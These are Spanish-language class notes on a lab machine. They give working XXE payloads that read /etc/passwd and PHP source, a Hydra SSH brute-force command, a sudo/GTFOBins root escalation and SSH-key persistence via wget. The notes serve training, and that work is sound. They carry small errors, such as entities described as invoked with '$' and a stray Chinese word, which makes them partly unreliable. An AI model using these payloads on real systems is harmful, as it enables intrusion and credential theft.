## ① Repaso de conceptos previos — Path Traversal y LFI

### La cadena de dependencias

Carlos refresca los conceptos de la sesión anterior antes de meterse con XXE:

```
Path Traversal → LFI (Local File Inclusion)
 ↓
Consecuencia de una vulnerabilidad previa
```

> [!note] La pregunta de Carlos
> "¿Qué vulnerabilidad nos habilita tener un Local File Inclusion y un Remote File Inclusion?"
> **Respuesta:** Path Traversal — la capacidad de navegar entre directorios con `../`

### La variable que lo habilita

Para explotar un Path Traversal necesitás una **variable** en la que puedas inyectar una ruta hacia un fichero:

```php
// Ejemplo vulnerable
$fichero = $_GET['archivo'];
readfile("ficheros/" . $fichero); // Sin sanitizar
```

```
URL: ?archivo=../../../../etc/passwd
Resultado: /etc/passwd → LFI
```

> [!important] LFI es una consecuencia, no la vulnerabilidad en sí
> El Local File Inclusion **no es la vulnerabilidad**, sino el **resultado** de explotar una vulnerabilidad previa (Path Traversal). Esto es clave para entender XXE.

## ② ¿Qué es XML? — Fundamentos

### Lenguaje estructurado vs. no estructurado

Carlos explica los dos tipos de lenguaje que un servidor puede recibir:

| Tipo | Ejemplo | Descripción |
|------|---------|-------------|
| **No estructurado** | Mensaje de WhatsApp, texto libre | Formato libre, sin reglas. Con el auge de las IAs/LLMs se usa más |
| **Estructurado** | JSON, XML, SQL, SAP | Formato predefinido. El servidor sabe qué va a recibir |

> [!note] La analogía de Carlos
> "A un servidor no le puedes lanzar lenguaje no estructurado. El servidor necesita saber qué formato va a recibir para hacer el parser (la extracción de datos por campo)."

### JSON — el conocido

```json
{
 "user": "pepito",
 "password": "123456"
}
```

- El servidor sabe que cuando llega algo `.json` tiene `nombre_variable: valor`
- Muy usado en **JWT** (JSON Web Token) — formato de intercambio cliente-servidor

### XML — el que no sabías que conocías

XML usa **angulitos** `< >` como HTML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<usuario>
 <nombre>Mariana</nombre>
 <email>artevolves@ejemplo.com</email>
</usuario>
```

| Elemento | Qué es |
|----------|--------|
| `<usuario>` | Clase/etiqueta (como una clase en Java) |
| `<nombre>` | Atributo/propiedad |
| `</usuario>` | Cierre de etiqueta |

> [!warning] El secreto mejor guardado
> **Word y PDF son XML por debajo.** Si le pedís a una IA que os haga un Word o PDF, veréis que programa en XML. XML es el lenguaje más utilizado del mundo, aunque pensemos que no se usa.

### ¿Cómo detectar si una web acepta XML?

```
Headers a revisar en Burp Suite / DevTools:

Accept: text/html, application/xhtml+xml, application/xml;q=0.9
 ^^^^^^^^^^^^^^^^^
 → Acepta XML

Content-Type: application/xml
 ^^^^^^^^^^^^^^^
 → Envía XML
```

> [!important] La regla de oro
> Si en los headers ves `application/xml` en `Accept` o `Content-Type`, lo más probable es que puedas enviarle un XML y sea capaz de procesarlo.

## ③ XML y System — La base de XXE

### Entidades y variables

XML permite crear **entidades** (variables) que se invocan con el símbolo `$`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE nota [
 <!ENTITY empresa "Seguros Norte S.A.">
]>
<nota>
 Bienvenido a $empresa.
</nota>
```

**Resultado:** `Bienvenido a Seguros Norte S.A.`

> [!note] La analogía con PHP
> "Es el mismo concepto que en PHP: `$_GET['parametro']` → variable que coge un valor. Solo que ahora en vez de `.php` tenemos un `.xml`."

### Importar librerías — como `import os` en Python

Así como en Python hacemos `import os` para usar `os.system()`, XML tiene la capacidad de utilizar **librerías y funciones del sistema**:

```python
# Python
import os
os.system("cat /etc/passwd") # Ejecuta un comando del sistema
```

```xml
<!-- XML con acceso a sistema -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE nota [
 <!ENTITY jefe SYSTEM "file:///etc/passwd">
]>
<nota>
 $jefe
</nota>
```

**Resultado:** El contenido de `/etc/passwd`

> [!important] La diferencia clave
> - En Python: `os.system()` ejecuta **comandos** del sistema
> - En XML: `SYSTEM` lee **ficheros** del sistema (solo lectura, no ejecución)

## ④ ¿Qué es un XXE? — XML External Entity

### Definición

**XXE (XML External Entity)** es una vulnerabilidad que permite a un atacante:

1. Inyectar una entidad XML que acceda a **ficheros locales del servidor**
2. El servidor **ejecuta** la petición XML y **refleja** el resultado en la respuesta

### Ciclo de explotación completo

```
┌─────────────────────────────────────────────────────────────┐
│ 1. Detectar que la web acepta XML (headers Accept/CT) │
│ 2. Enviar XML de prueba → ver si se ejecuta y refleja │
│ 3. Inyectar entidad SYSTEM para leer ficheros │
│ 4. Obtener información sensible (/etc/passwd, config, etc.)│
│ 5. Con datos → fuerza bruta / escalada │
└─────────────────────────────────────────────────────────────┘
```

> [!note] Error Base — tu mejor aliado
> Cuando envías un XML malformado y el servidor te devuelve un error descriptivo (como "XML not provided" o "Start Tag Expected"), eso es un **Error Base**: la aplicación te está revelando información sobre qué espera. Esto es una **exposición de información** que facilita el ataque.

## ⑤ Las 4 formas de ejecutar un fichero subido

Carlos repasa las 4 maneras de que un fichero subido se ejecute (concepto clave para entender por qué XXE funciona):

| # | Forma | Ejemplo |
|---|-------|---------|
| 1 | **Acceder a la ruta** | Subes un `.php` y accedes a `uploads/shell.php` |
| 2 | **Un tercero lo ejecuta** | Dejas un `.exe` en la puerta y alguien lo ejecuta (social engineering) |
| 3 | **Cron job programado** | Hay una tarea programada que ejecuta el fichero periódicamente |
| 4 | **Visualización/previsualización** | Subes un PDF → el servidor lo "previsualiza" → ejecuta el contenido XML |

> [!important] La forma que nos importa hoy
> La **forma 4** es la que se usa en XXE: subimos un documento (PDF/XML) con código XML inyectado, y cuando el servidor lo **previsualiza o procesa**, ejecuta la entidad que hemos definido para leer ficheros internos.

### Visualización vs. almacenamiento

| Concepto | Detalle |
|----------|---------|
| **Preview** (previsualización) | Se queda en **memoria**. Si está bien programado, no persiste |
| **Perfil guardado** | Se guarda en el **servidor**. Más peligroso |

> [!warning] El error de diseño
> "Si se cae en el perfil, guardado, guay. Pero si el preview se queda en memoria y luego se descarta, perdemos la oportunidad de explotación. Por eso interceptamos con Burp y modificamos ANTES de que llegue al servidor."

## ⑦ Explotación — XXE en upload.php

### Paso 1: Interceptación con Burp Suite

```
1. Activar Foxy Proxy → Burp
2. Abrir upload.php en el navegador
3. Hacer una petición cualquiera
4. Capturar en Proxy → Send to Repeater
```

### Paso 2: Prueba inicial — texto normal

```
POST /upload.php HTTP/1.1
Host: 10.0.2.10
Content-Type: application/xml

hola
```

**Respuesta:** `Start Tag Expected, '<' Not Found`

> [!note] Error Base
> El servidor nos dice que espera algo que empiece por `<`. Esto es una **exposición de información** — nos está guiando hacia el formato correcto.

### Paso 3: Probar con PHP

```
POST /upload.php HTTP/1.1
Host: 10.0.2.10
Content-Type: application/xml

<?php system("id"); ?>
```

**Respuesta:** `Start Tag Expected, Not Found`

> No acepta PHP. Los headers dicen `application/xml` — vamos a probar con XML.

### Paso 4: Probar con XML válido

```
POST /upload.php HTTP/1.1
Host: 10.0.2.10
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<root>
 <user>test</user>
</root>
```

**Respuesta:** `200 OK` + **el contenido del XML reflejado en la respuesta**

> [!important] ¡REFLEJADO!
> El servidor recibe nuestro XML, lo procesa y nos devuelve el contenido. Esto significa que **se está ejecutando en el backend** y nos muestra el resultado. Esto es un **reflected** — como un XSS pero con XML.

### Paso 5: Confirmación — ¿Está en /uploads?

```
Navegar a http://10.0.2.10/uploads/
```

**Resultado:** El fichero **no aparece** en `/uploads`. Se guarda en otra ruta.

> [!note] Aunque no esté en uploads, el reflected nos basta
> "Si el servidor me muestra el contenido del XML que le he subido, es que lo está ejecutando. No necesito que esté en una ruta accesible — el reflected me da la información directamente."

### Paso 6: XXE → Lectura de /etc/passwd

```
POST /upload.php HTTP/1.1
Host: 10.0.2.10
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
 <user>&xxe;</user>
</root>
```

**Resultado:** El contenido completo de `/etc/passwd` reflejado en la respuesta.

**Usuarios identificados con `/bin/bash`:**
- `root`
- `castorcin`

> [!important] La cadena de explotación hasta aquí
> ```
> File Upload Bypass → Path Traversal → XXE → LFI → /etc/passwd
> ```

## ⑧ Diferencia entre XXE y Path Traversal clásico

### Comparativa con la máquina Rockstar

| Aspecto | Rockstar (Path Traversal) | Castor (XXE) |
|---------|---------------------------|---------------|
| **Vector** | Parámetro con nombre de fichero | Endpoint que acepta XML |
| **Mecanismo** | `../` para navegar directorios | Entidad `SYSTEM "file:///"` |
| **Resultado** | LFI (lectura de fichero) | LFI (lectura de fichero) |
| **Acceso** | Desde el directorio hacia atrás | Desde la estructura del backend |

> [!note] La explicación de Carlos
> "En Rockstar encontramos un directorio, un fichero, un parámetro que acepta un nombre de fichero y lo abre. La vulnerabilidad era Path Traversal porque el nombre del fichero tenía `../`. Aquí el problema es que acepta XML y el XML permite una lectura interna con `SYSTEM`."

## ⑨ Fuerza bruta con Hydra — Obtención de credenciales

### Contexto

Tras leer `/etc/passwd` y obtener el usuario `castorcin`, Carlos explica la regla:

> [!important] La regla del acceso inicial
> "Si el acceso inicial no es una reverse shell, y tenemos usuario pero no contraseña, sacamos el bazooka: **Hydra**."

### Comando Hydra

```bash
hydra -l castorcin -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.10
```

| Parámetro | Descripción |
|-----------|-------------|
| `-l castorcin` | Usuario a atacar (obtenido de `/etc/passwd`) |
| `-P rockyou.txt` | Lista de contraseñas |
| `ssh://10.0.2.10` | Servicio y objetivo |

**Resultado:** Contraseña `chocolate`

### Acceso SSH

```bash
ssh castorcin@10.0.2.10
# Password: chocolate
```

> [!warning] Reutilización de credenciales
> La contraseña de la base de datos es la misma que la del sistema. Esto es un error de configuración极其 común y peligroso.

## ⑩ Escalada de privilegios — sudo -l + GTFOBins

### Los 5 comandos iniciales

```bash
whoami # castorcin
pwd # /home/castorcin
uname -a # Versión del kernel
sudo -l # Permisos de sudo
find / -perm -4000 -type f 2>/dev/null # Buscar SUIDs
```

### sudo -l — El hallazgo

```bash
sudo -l
```

**Resultado:**

```
User castorcin may run the following commands:
 (ALL) NOPASSWD: /usr/bin/set
```

> [!important] ¡Sin password!
> El usuario `castorcin` puede ejecutar `set` como **cualquier usuario** (incluido root) **sin contraseña**.

### GTFOBins — La escalada

```bash
# 1. Buscar en GTFOBins → "set" → Privilege Escalation → sudo
# 2. Ejecutar el comando que nos da GTFOBins:
sudo set --eval 'echo root:password | chpasswd && /bin/bash'
```

**Resultado:** Shell de root

```bash
# Verificar
whoami
# root
```

> [!note] La explicación de Carlos
> "`sudo -l` nos da un binario. GTFOBins, como lo hemos hecho con sudo, nos metemos en sudo. Si en vez de sudo hubiésemos utilizado `find / -perm -4000 -type f`, estaríamos buscando SUIDs."

### Verificación de SUIDs

```bash
find / -perm -4000 -type f 2>/dev/null
```

Resultado: comandos habituales (`sudo`, `su`, `mount`, `passwd`) más `set`.

## ⑪ Persistencia — Clave SSH desde la máquina

### El truco de Chema

Chema genera una clave SSH dentro de la máquina y la exporta para tener persistencia:

```bash
# 1. Generar clave SSH
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N ""

# 2. Montar servidor HTTP para descargar la clave privada
python3 -m http.server 8000

# 3. Desde tu máquina atacante, descargar la clave
wget http://10.0.2.10:8000/.ssh/id_rsa

# 4. Conectar como root con la clave
ssh -i id_rsa root@10.0.2.10
```

> [!important] Persistencia con clave SSH
> "Entrar así por SSH con root y una clave privada es mi persistencia favorita. Te sientes increíble al terminar."

## ⑬ Problema del Base64 al leer código PHP

### El conflicto con el parser XML

Cuando intentás leer un fichero `.php` a través de XXE, el contenido tiene `<` y `>` que **rompen el parser XML**:

```xml
<!-- Esto ROMPE el XML -->
<!ENTITY xxe SYSTEM "file:///var/www/html/datos.php">
<!-- El PHP contiene <?php ... ?> que tiene < > que colisionan -->
```

### La solución: Base64

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
 <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/datos.php">
]>
<root>
 <user>&xxe;</user>
</root>
```

**Resultado:** Una cadena en Base64 que decodificás:

```bash
echo "PD9waHAuLi4=" | base64 -d
# <?php... (contenido del fichero)
```

> [!important] ¿Por qué Base64?
> Base64 solamente tiene números, letras y los caracteres `+`, `/`, `=`. **Nunca va a tener `<` ni `>`,** por ende nunca rompe la codificación XML. Es un "wrapper" (envoltorio) que protege el contenido.

> [!note] El truco del wrapper
> "Cuando algo no rompe el parser, lo que tenemos que hacer es envolverlo. Con `php://filter/convert.base64-encode` envolvemos el contenido antes de que se procese."
